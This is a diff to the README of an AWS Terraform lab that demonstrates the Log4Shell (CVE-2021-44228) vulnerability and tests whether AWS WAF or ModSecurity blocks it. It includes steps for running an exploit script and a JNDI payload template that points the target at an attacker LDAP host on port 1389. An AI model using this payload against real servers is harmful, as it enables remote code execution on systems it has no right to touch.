@@ -3,6 +3,14 @@
 ## Project Description
 This project files demostrate a proof-of-concept of log4j vulnerability (CVE-2021-44228) on AWS using Terraform Infrastructure-as-a-code means.
 
+There are 2 demo in this project:  
+1. single-instance contains a vulnerable server, you can use your personal computer to exploit the server, the server should be protected with AWS WAF.
+2. double-instance contans 2 services, the vulnerable server can only be access from the reverse proxy server, the reverse proxy should be protected by ModSecurity.
+
+Conclusion:
+The 1st demo demostrate a successful exploit using AWS WAF. The 2nd demo was an unsuccessful attempt when ModSecurity is in placed. Removing ModSecurity the exploit will be successful. It may be because ModSecurity is an active project therefore the vulnerable strings has been identified and filtered.
+
+
 # Credit
 This poc was from :
 https://github.com/kozmer/log4j-shell-poc  
@@ -54,17 +62,22 @@ Set execute permission  (in same workdir= single-instance)
 `chmod +x exploit-script-remote.sh`    
 
 Run script with 2 supplied variable   
-`./exploit-script-remote.sh <1: desktop | cloud> <2: remote ip>`
+`./exploit-script-remote.sh <1: desktop | cloud>`  
+where desktop means your workdir is at Desktop and cloud means your workdir at ~/
 
-Note the payload is displayed end of script
+Note the payload is displayed end of script similar to `${jndi:ldap://<ip-address>:1389/a}`
 
 ## Vulnerable Server:  
 Visit `http:<aws host url>:8080`
 
-Copy the payload into the username field then submit forms  
+Copy the payload into the 'username' field then submit forms  
 
 ![exploit](https://github.com/moshuum/tf-log4j-aws-poc/blob/main/images/Screenshot%202022-06-07%20034332.png?raw=true)
 
+
+## Remark 
+JDK file: have ensure the integrity from baidu source is same hash from Oracle  
+SHA256          187EDA2235F812DDB35C352B5F9AA6C5B184D611C2C9D0393AFB8031D8198974
 
 ## References
 Instance
